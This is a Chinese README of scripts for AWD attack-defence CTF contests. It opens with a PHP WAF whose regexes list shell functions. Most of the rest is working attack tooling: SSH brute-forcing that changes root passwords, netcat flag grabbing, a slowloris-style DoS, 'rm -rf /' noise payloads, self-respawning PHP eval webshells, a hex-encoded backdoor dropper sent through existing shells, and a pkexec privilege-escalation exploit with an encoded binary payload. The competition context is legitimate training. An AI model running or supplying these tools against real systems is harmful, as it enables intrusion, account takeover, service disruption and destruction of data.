# AWD
用于AWD竞赛



# 一、Waf通防

> 使用方法，在需要防护的文件中包含该文件 使用require_once('waf.php'); 或者include('waf.php');

```python
<?php
header('Content-Type: text/html; charset=utf-8');
error_reporting(0);

define('LOG_FILENAME', 'Attack_Big_information.txt');	
function waf() {
    if (!function_exists('getallheaders')) {
        function getallheaders() {
            foreach ($_SERVER as $name => $value) {
                if (substr($name, 0, 5) == 'HTTP_') $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5))))) ] = $value;
            }
            return $headers;
        }
    }
    $get = $_GET;
    $post = $_POST;
    $cookie = $_COOKIE;
    $header = getallheaders();
    $files = $_FILES;
    $ip = $_SERVER["REMOTE_ADDR"];
    $method = $_SERVER['REQUEST_METHOD'];
    $filepath = $_SERVER["SCRIPT_NAME"];
    foreach ($_FILES as $key => $value) {
        $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']);
        file_put_contents($_FILES[$key]['tmp_name'], "virink");
    }
    unset($header['Accept']); //fix a bug
    $input = array(
        "Get" => $get,
        "Post" => $post,
        "Cookie" => $cookie,
        "File" => $files,
        "Header" => $header
    );
    $pattern = "select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex";
    $pattern.= "|file_put_contents|fwrite|curl|system|eval|assert";
    $pattern.= "|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore";
    $pattern.= "|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec";
    $vpattern = explode("|", $pattern);
    $bool = false;
    foreach ($input as $k => $v) {
        foreach ($vpattern as $value) {
            foreach ($v as $kk => $vv) {
                if (preg_match("/$value/i", $vv)) {
                    $bool = true;
                    logging($input);
                    break;
                }
            }
            if ($bool) break;
        }
        if ($bool) break;
    }
}
function logging($var) {
	date_default_timezone_set("Asia/Shanghai");
	$time=date("Y-m-d H:i:s");
    file_put_contents(LOG_FILENAME, "\r\n\r\n\r\n" . $time . "\r\n" . print_r($var, true) , FILE_APPEND);
}
waf();


class waf{
	
	private $request_url;
	private $request_method;
	private $request_data;
	private $headers;
	private $raw;

	
// 自动部署构造方法
function __construct(){
	//echo "class waf construct execute..</br>";   //debug code
	$this->write_access_log_probably();  //记录访问纪录    类似于日志
	$this->write_access_logs_detailed();  //纪录详细访问请求包  
	//echo "class waf construct execute..2</br>";	
	if($_SERVER['REQUEST_METHOD'] != 'POST' && $_SERVER['REQUEST_METHOD'] != 'GET'){
    write_attack_log("method");
	}
	//echo "class waf construct execute..3</br>";
	$this->request_url= $_SERVER['REQUEST_URI']; //获取url来进行检测


	$this->request_data = file_get_contents('php://input'); //获取post

	$this->headers =$this->get_all_headers(); //获取header  

	//echo "class waf construct execute half..</br>";


	$this->filter_attack_keyword($this->filter_invisible(urldecode($this->filter_0x25($this->request_url)))); //对URL进行检测，出现问题则拦截并记录
	$this->filter_attack_keyword($this->filter_invisible(urldecode($this->filter_0x25($this->request_data)))); //对POST的内容进行检测，出现问题拦截并记录
	//echo "class waf construct execute..4</br>";
	$this->detect_upload();

	$this->gloabel_attack_detect();
	
	
	//echo "class waf construct execute  success..</br>";



}

//全局输入检测  基本的url和post检测过了则对所有输入进行简单过滤

function gloabel_attack_detect(){
	
	foreach ($_GET as $key => $value) {
		$_GET[$key] = $this->filter_dangerous_words($value);
	}
	foreach ($_POST as $key => $value) {
		$_POST[$key] = $this->filter_dangerous_words($value);
	}
	foreach ($headers as $key => $value) {
		$this->filter_attack_keyword($this->filter_invisible(urldecode(filter_0x25($value)))); //对http请求头进行检测，出现问题拦截并记录
		$_SERVER[$key] = $this->filter_dangerous_words($value); //简单过滤
	}
}


//拦截所有的文件上传  并记录上传操作  并将上传文件保存至系统tmp文件夹下
function detect_upload(){
	foreach ($_FILES as $key => $value) {
        if($_FILES[$key]['size']>1){
			echo "小伙子你不讲武德啊，你这上传的是啥?????你很危险啊！(╯‵□′)╯︵┻━┻";
			$this->write_attack_log("Upload");
			//move_uploaded_file($_FILES[$key]["tmp_name"],'/tmp/uoloadfiles/'.$_FILES[$key]["name"]);
			exit(0);
		}
    }
}
	
//记录每次大概访问记录，类似日志，以便在详细记录中查找
function write_access_log_probably() { 
    $raw = date("Y/m/d H:i:s").'    '; 
    $raw .= $_SERVER['REQUEST_METHOD'].'     '.$_SERVER['REQUEST_URI'].'     '.$_SERVER['REMOTE_ADDR'].'    '; 
    $raw .= 'POST: '.file_get_contents('php://input')."\r\n"; 
	$ffff = fopen('all_requests.txt', 'a'); //日志路径 
    fwrite($ffff, $raw);  
    fclose($ffff);
}

//记录详细的访问头记录，包括GET POST http头   以获取通防waf未检测到的攻击payload
function write_access_logs_detailed(){
    $data = date("Y/m/d H:i:s")." -- "."\r\n".$this->get_http_raws()."\r\n\r\n";
    $ffff = fopen('all_requests_detail.txt', 'a'); //日志路径 
    fwrite($ffff, urldecode($data));  
    fclose($ffff);
}	
	
/*
获取http请求头并写入数组
*/
function get_all_headers() { 
    $headers = array(); 
 
    foreach($_SERVER as $key => $value) { 
        if(substr($key, 0, 5) === 'HTTP_') { 
            $headers[$key] = $value; 
        } 
    } 
 
    return $headers; 
}
/*
检测不可见字符造成的截断和绕过效果，注意网站请求带中文需要简单修改
*/
function filter_invisible($str){
    for($i=0;$i<strlen($str);$i++){
        $ascii = ord($str[$i]);
        if($ascii>126 || $ascii < 32){ //有中文这里要修改
            if(!in_array($ascii, array(9,10,13))){
                write_attack_log("interrupt");
            }else{
                $str = str_replace($ascii, " ", $str);
            }
        }
    }
    $str = str_replace(array("`","|",";",","), " ", $str);
    return $str;
}

/*
检测网站程序存在二次编码绕过漏洞造成的%25绕过，此处是循环将%25替换成%，直至不存在%25
*/
function filter_0x25($str){
    if(strpos($str,"%25") !== false){
        $str = str_replace("%25", "%", $str);
        return filter_0x25($str);
    }else{
        return $str;
    }
} 	


/*
攻击关键字检测，此处由于之前将特殊字符替换成空格，即使存在绕过特性也绕不过正则的\b
*/
function filter_attack_keyword($str){
    if(preg_match("/select\b|insert\b|update\b|drop\b|and\b|delete\b|dumpfile\b|outfile\b|load_file|rename\b|floor\(|extractvalue|updatexml|name_const|multipoint\(/i", $str)){
        $this->write_attack_log("sqli");
    }

    //文件包含的检测
    if(substr_count($str,$_SERVER['PHP_SELF']) < 2){
        $tmp = str_replace($_SERVER['PHP_SELF'], "", $str);
        if(preg_match("/\.\.|.*\.php[35]{0,1}/i", $tmp)){ 
            $this->write_attack_log("LFI/LFR");;
        }
    }else{
        $this->write_attack_log("LFI/LFR");
    }
    if(preg_match("/base64_decode|eval\(|assert\(|file_put_contents|fwrite|curl|system|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restorei/i", $str)){
        $this->write_attack_log("EXEC");
    }
    if(preg_match("/flag/i", $str)){
        $this->write_attack_log("GETFLAG");
    }

}

/*
简单将易出现问题的字符替换成中文
*/
function filter_dangerous_words($str){
    $str = str_replace("'", "‘", $str);
    $str = str_replace("\"", "“", $str);
    $str = str_replace("<", "《", $str);
    $str = str_replace(">", "》", $str);
    return $str;
}

/*
获取http的请求包，意义在于获取别人的攻击payload
*/
function get_http_raws() { 
    $raw = ''; 

    $raw .= $_SERVER['REQUEST_METHOD'].' '.$_SERVER['REQUEST_URI'].' '.$_SERVER['SERVER_PROTOCOL']."\r\n"; 
     
    foreach($_SERVER as $key => $value) { 
        if(substr($key, 0, 5) === 'HTTP_') { 
            $key = substr($key, 5); 
            $key = str_replace('_', '-', $key); 
            $raw .= $key.': '.$value."\r\n"; 
        } 
    } 
    $raw .= "\r\n"; 
    $raw .= file_get_contents('php://input'); 
    return $raw; 
}

/*
这里拦截并记录攻击payload      第一个参数为记录类型   第二个参数是日志内容   使用时直接调用函数
*/
function write_attack_log($alert){
    $data = date("Y/m/d H:i:s")." -- [".$alert."]"."\r\n".$this->get_http_raws()."\r\n\r\n";
    $ffff = fopen('attack_detected_log.txt', 'a'); //日志路径 
    fwrite($ffff, $data);  
    fclose($ffff);
    if($alert == 'GETFLAG'){
        echo "flag{erxianqiao_NB_NO1_c001}"; //如果请求带有flag关键字，显示假的flag。（2333333）
    }else{
        sleep(3); //拦截前延时3秒
    }
    exit(0);
}

	
}
$waf = new waf();

?>

```


# 二、SSH弱口令

> cat其他人flag并且修改掉ssh的弱口令，NC高位端口连接即有shell的也有单独列出来的


```python
import paramiko
import pexpect   #NC漏洞
import threading
import time

username=[]
passwd=[]
host = "192.168.132."

def C(cmd,newpw,username,passwd):
    for num in range(0,255):
        for i in range(0,len(username)):
            U=username[i]
            print("用户名为:",U)
            for j in range(0,len(passwd)):
                print("密码为:",U)
                P=passwd[j]
                ip = host+str(num)
                print("正在连接",ip)
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    ssh.connect(hostname=ip,port = 22,username=U,password=P,timeout=1) 
                    stdin,stdout,stderr = ssh.exec_command(cmd)
                    flag = stdout.read().decode('utf-8')
                    print("目标:"+ip+"存在漏洞，内容为:"+flag,end='')
                    print("IP:"+ip+"密码已修改成:"+newpw)
                    check="echo"+" root:"+ newpw + " | chpasswd"
                    stdin1,stdout1,stderr1 = ssh.exec_command(check)
                    ssh.close()
                except:
                    pass

def addusername(end1):
    for i in range(0,end1):
        end1=str(end1)
        i=str(i)
        Loading=input("一共输入"+end1+"个用户,请输入第"+i+"个值:")
        username.append(Loading)
        print(username)
    return username

def addpasswd(end2):
    for i in range(0,end2):
        end2=str(end2)
        i=str(i)
        Loading=input("一共输入"+end2+"个密码,请输入第"+i+"个值:")
        passwd.append(Loading)
        print(passwd)
    return passwd

def NC(END):       #注意！！！该方法只能在Linux中也就是kali中运行，因为pexpect中的函数是不支持在windows中运行的
    while(1):     #可一直循环占坑，防止其他人连接
        for i in range(0,END):
            host='192.168.132.'+str(i)
            # for j in range(0,65535):      ##爆破端口
            #     j=str(j)
            #     a = pexpect.spawn("nc %s %s:"%(host,j))
            a = pexpect.spawn("nc %s 8888:"%host)   #指定高位端口
            a.setecho(False)
            a.sendline('cat /flag.txt')
            a.sendline('exit')
            flag=a.read()
            print(host+':'+flag)

if __name__=='__main__':
    cmd=input("请输入值你需要执行的命令:")
    newpw=input("需要修改的密码:")
    end1=int(input("输入一共需要几个用户:"))
    addusername(end1)
    end2=int(input("输入一共需要几个密码:"))
    addpasswd(end2)
    C(cmd,newpw,username,passwd)
    # END=int(input("输入群体目标NC最后一位:"))
    # NC(END)
```


# 三、NC高位端口

> NC端口爆破或批量连接

```python
# -*- coding: utf-8 -*
#只允许在Linux环境中运行
import pexpect
import threading
import time

while(1):     #可一直循环占坑，防止其他人连接
    for i in range(30,40):
        host='192.168.132.'+str(i)
        # for j in range(0,65535):      ##爆破端口
        #     j=str(j)
        #     a = pexpect.spawn("nc %s %s:"%(host,j))
        a = pexpect.spawn("nc %s 8888:"%host)
        a.setecho(False)
        a.sendline('cat /flag.txt')
        a.sendline('exit')
        flag=a.read()
        print(host+':'+flag)
```


# 四、Dos脚本

> 这种情况便是不想玩了，玩不下去了被攻陷了，可以试着给别人一棒子

```python
import socket
import time
import threading

max=90000000
port=80                 #端口
host="192.168.92.154"   #IP
page="/index.php"

bag=("POST %s HTTP/1.1\r\n"
    "host: %s\r\n"
    "Content-Length: 1000000000\r\n"
    "Cookie: 1998\r\n"
    "\r\n" % (page,host))

socks = []

def connect():
    global socks
    for i in range(0,max):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((host,port))
            s.send(bag.encode("utf-8"))
            socks.append(s)
        except Exception as ex:
            time.sleep(1)

def send():
    global socks
    while True:
        for s in socks:
            try:
                print("攻击中....")
            except Exception as ex:
                socks.remove(s)
                s.close()
        time.sleep(0.1)

One = threading.Thread(target=connect,args=())
Two = threading.Thread(target=send,args=())
One.start()
Two.start()

```


# 五、主动防御反制他人WAF

> 当别人有waf记录你的行动时，可用这个waf针对他，让他们获取假的记录消息，达到干扰的目的

```python
import requests
import time

def scan_attack():
    file={'shell.php','admin.php','web.php','login.php','1.php','index.php'}
    payload={'cat /flag','ls -al','rm -f','echo 1','echo 1 /proc/sys/net/ipv4/ip_forward','rm -rf / --no-preserve-root'}
    while(1):
        for i in range(134, 135):
            for ii in file:
                url='http://192.168.92.'+ str(i)+'/'+ii
                print(url)
                for iii in payload:
                    data={
                        'payload':iii
                    }
                    try:
                        requests.post(url,data=data)
                        print("正在搅屎:"+str(i)+'|'+ii+'|'+iii)
                        time.sleep(0.1)
                    except Exception as e:
                        time.sleep(0.1)
                        pass


if __name__ == '__main__':
    scan_attack()

```


# 六、检测网站是否存活

> 有时候需要用到


```python
from threading import Thread
from queue import Queue
import requests
from time import time
import argparse

headers = {
 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
}

def ping(url, new_ip):
 url = url.strip()
 if (not url.startswith('http://')) and (not url.startswith('https://')):
  url = 'http://' + url
 try:
  req = requests.get(url, headers=headers, timeout=2)
  new_ip.put(url + ' -- ' + str(req.status_code))
  print("%s 存活" % url)
 except:
  print("%s 不存活" % url)

def new_list(file):
 with open(file, 'r') as f:
  new_ip = []
  ip_list = f.readlines()
  for ip in ip_list:
   ip = ip.strip().replace('http://', '').replace('https://', '')
   if ip:
    if not (ip in new_ip):
     new_ip.append(ip)
  return new_ip

def main(file, th):
 begin_time = time()
 new_ip = Queue()
 ip_list = new_list(file)
 j = 0
 length = len(ip_list)
 while j < length:
  threads = []
  for i in range(th):
   t = Thread(target=ping, args=(ip_list[j], new_ip))
   t.start()
   threads.append(t)
   j += 1
   if j == length:
    break
  for thread in threads:
   thread.join()
 with open('F:/Python3.0Work/搅屎棍脚本/new.txt', 'a+') as nf:  #写入
  while not new_ip.empty():
    if '404' is not new_ip.get():
      nf.write(new_ip.get()+'\n')
    else:
      break
 end_time = time()
 run_time = end_time - begin_time
 print("总共耗时 %s 秒"% run_time)


if __name__ == '__main__':
 parser = argparse.ArgumentParser(description='url active scan')
 parser.add_argument("-f", "--file", help="指定文件", default='F:/Python3.0Work/fdomain.txt')  #打开文件
 parser.add_argument("-t", "--thread", help="设置线程", default=50)
 args = parser.parse_args()
 file = args.file
 th = args.thread
 main(file, th)
```

# 七、不死马

> 防御类型不死马，抵消flag文件，在根目录运行替代flag

```python
<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file1 = 'flag.txt';
$code1 =  'iam123fakeh123rh1289e4u129e1e';
while (1){
	file_put_contents($file1,$code1);
	system('touch -m -d "2017-11-12 10:10:10" index.php');
	usleep(100);
}
?>

```

> 攻击类型不死马，生成隐藏木马

```python
<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.Indexl.php';
$code =  '<?php @eval($GET['1998c00l1998']);?>'; #这边可以自己换成加密木马
while (1){
	file_put_contents($file,$code);
	system('touch -m -d "2019-11-14 10:10:10" index.php');
	usleep(100);
}
?>

```


# 八、最新Linux系统提权脚本

> 最新较大的一个漏洞，可以用来提权

```python
from ctypes import *
from ctypes.util import find_library
import os
import zlib
import base64
import tempfile

payload = zlib.decompress(
    base64.b64decode(
        """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"""
    )
)
libc = CDLL(find_library("c"))
libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)
libc.execve.restype = c_ssize_t

wd = tempfile.mkdtemp()
open(wd + "/pwn.so", "wb").write(payload)
os.mkdir(wd + "/gconv/")
open(wd + "/gconv/gconv-modules", "w").write(
    "module  UTF-8//    INTERNAL    ../pwn    2"
)
os.mkdir(wd + "/GCONV_PATH=.")
os.mknod(wd + "/GCONV_PATH=./gconv")
os.chmod(wd + "/GCONV_PATH=.", 0o777)
os.chmod(wd + "/GCONV_PATH=./gconv", 0o777)
os.chmod(wd + "/pwn.so", 0o777)
os.chdir(wd)
cmd = b"/usr/bin/pkexec"
argv = []
envp = [
    b"gconv",
    b"PATH=GCONV_PATH=.",
    b"LC_MESSAGES=en_US.UTF-8",
    b"XAUTHORITY=../gconv",
    b"",
]

cargv = (c_char_p * (len(argv) + 1))(*argv, None)
cenv = (c_char_p * (len(envp) + 1))(*envp, None)
libc.execve(cmd, cargv, cenv)
```


# 九、命令执行脚本

> 带过滤html标签的较为干净

```python
import requests
from bs4 import BeautifulSoup
import re

def filter_tags(htmlstr):
    #先过滤CDATA
    re_cdata=re.compile('//<!\[CDATA\[[^>]*//\]\]>',re.I) #匹配CDATA
    re_script=re.compile('<\s*script[^>]*>[^<]*<\s*/\s*script\s*>',re.I)#Script
    re_style=re.compile('<\s*style[^>]*>[^<]*<\s*/\s*style\s*>',re.I)#style
    re_br=re.compile('<br\s*?/?>')#处理换行
    re_h=re.compile('</?\w+[^>]*>')#HTML标签
    re_comment=re.compile('<!--[^>]*-->')#HTML注释
    s=re_cdata.sub('',htmlstr)#去掉CDATA
    s=re_script.sub('',s) #去掉SCRIPT
    s=re_style.sub('',s)#去掉style
    s=re_br.sub('\n',s)#将br转换为换行
    s=re_h.sub('',s) #去掉HTML 标签
    s=re_comment.sub('',s)#去掉HTML注释
    blank_line=re.compile('\n+')
    s=blank_line.sub('\n',s)
    s=replaceCharEntity(s)#替换实体
    return s

def replaceCharEntity(htmlstr):
    CHAR_ENTITIES={'nbsp':' ','160':' ',
        'lt':'<','60':'<',
        'gt':'>','62':'>',
        'amp':'&','38':'&',
        'quot':'"','34':'"',}
 
    re_charEntity=re.compile(r'&#?(?P<name>\w+);')
    sz=re_charEntity.search(htmlstr)
    while sz:
        entity=sz.group()#entity全称，如>
        key=sz.group('name')#去除&;后entity,如>为gt
        try:
            htmlstr=re_charEntity.sub(CHAR_ENTITIES[key],htmlstr,1)
            sz=re_charEntity.search(htmlstr)
        except KeyError:
            #以空串代替
             htmlstr=re_charEntity.sub('',htmlstr,1)
             sz=re_charEntity.search(htmlstr)
    return htmlstr

def catflag():
    IP=input("输入IP地址部分段(如192.168.132.空):")

    for i in range(30,50):
        try:
            i=str(i)
            NewIP=IP+i
            target = "http://"+NewIP+"/b.php?shell=system(%27\cat%20/flag.txt%27);"
            req = requests.get(url=target,timeout=2)
            html = req.text
            bf = str(BeautifulSoup(html))
            checks=filter_tags(bf)
            flag=('IP为:'+NewIP+':'+checks)
            print(flag)
            f.write(flag)
        except:
            pass

if __name__=='__main__':
    f=open('F:/Python3.0Work/AWD/flag.txt','w')
    catflag()
    f.close()
   
```


# 十、通过POST木马连接上注入GET类型不死马且获取flag值

> 通过批量化连接原先含有的POST木马注入自己的不死马且批量获取flag值



```python
from urllib import request
import re
import requests
import re
from bs4 import BeautifulSoup
#连接post型预留木马进行内存马的注入
#需要的参数：1、原POST木马地址和参数  2、需要扫描的地址区间

def filter_tags(htmlstr):
    #先过滤CDATA
    re_cdata=re.compile('//<!\[CDATA\[[^>]*//\]\]>',re.I) #匹配CDATA
    re_script=re.compile('<\s*script[^>]*>[^<]*<\s*/\s*script\s*>',re.I)#Script
    re_style=re.compile('<\s*style[^>]*>[^<]*<\s*/\s*style\s*>',re.I)#style
    re_br=re.compile('<br\s*?/?>')#处理换行
    re_h=re.compile('</?\w+[^>]*>')#HTML标签
    re_comment=re.compile('<!--[^>]*-->')#HTML注释
    s=re_cdata.sub('',htmlstr)#去掉CDATA
    s=re_script.sub('',s) #去掉SCRIPT
    s=re_style.sub('',s)#去掉style
    s=re_br.sub('\n',s)#将br转换为换行
    s=re_h.sub('',s) #去掉HTML 标签
    s=re_comment.sub('',s)#去掉HTML注释
    blank_line=re.compile('\n+')
    s=blank_line.sub('\n',s)
    s=replaceCharEntity(s)#替换实体
    return s

def replaceCharEntity(htmlstr):
    CHAR_ENTITIES={'nbsp':' ','160':' ',
        'lt':'<','60':'<',
        'gt':'>','62':'>',
        'amp':'&','38':'&',
        'quot':'"','34':'"',}
 
    re_charEntity=re.compile(r'&#?(?P<name>\w+);')
    sz=re_charEntity.search(htmlstr)
    while sz:
        entity=sz.group()#entity全称，如>
        key=sz.group('name')#去除&;后entity,如>为gt
        try:
            htmlstr=re_charEntity.sub(CHAR_ENTITIES[key],htmlstr,1)
            sz=re_charEntity.search(htmlstr)
        except KeyError:
            #以空串代替
             htmlstr=re_charEntity.sub('',htmlstr,1)
             sz=re_charEntity.search(htmlstr)
    return htmlstr

def catflag():
    for i in range(30,40):
        try:
            i=str(i)
            IP='192.168.132.'
            NewIP=IP+i
            target = "http://"+NewIP+"/.Index.php?1998=system(%27\cat%20/flag.txt%27);"
            req = requests.get(url=target,timeout=2)
            html = req.text
            bf = str(BeautifulSoup(html))
            checks=filter_tags(bf)
            flag=('IP为:'+NewIP+':'+checks)
            N=flag.find('404 Not Found')
            if N<0:
                f.write(flag)
                print(flag)
            else:
                pass
        except:
            pass

def Nodead():
        for i in range(30,40):
            i=str(i)
            url = "http://192.168.132."+i+"/c.php"  #url后面的马按照已知马填写
            #下面的第一个是post木马的参数，第二个是写入不死马，不死马已经做了hex转换了，不死马名称为.checkder.php，当执行了不死马便会生成名称为.Index.php的get型木马，参数为1998
            cmd = {'c':"system('echo 3c3f706870200a69676e6f72655f757365725f61626f72742874727565293b0a7365745f74696d655f6c696d69742830293b0a756e6c696e6b285f5f46494c455f5f293b0a2466696c65203d20272e496e6465782e706870273b0a24636f6465203d2020273c3f70687020406576616c28245f4745545b313939385d293b3f3e273b0a7768696c65202831297b0a0966696c655f7075745f636f6e74656e7473282466696c652c24636f6465293b0a0973797374656d2827746f756368202d6d202d642022323032312d30312d31332031383a31303a313022202e496e6465782e70687027293b0a0975736c65657028313030293b0a7d0a3f3e|xxd -r -ps > .checkder.php');"}  #参数[a]  进行写入不死马
            # for i in range(1,255):
            try:
                r = requests.post(url,data=cmd,timeout=2)
                a=r.text
                if len(a)==0:
                    print(url+"<<<已插入木马")
                    urlTwo = "http://192.168.132."+i+"/.checkder.php"
                    r2 = requests.get(url=urlTwo,timeout=2)
                else:
                    pass
            except:
                pass

if __name__ =='__main__':
    print('Loading......')
    f=open('F:/Python3.0Work/AWD/flag.txt','w')
    Nodead()
    catflag()

```
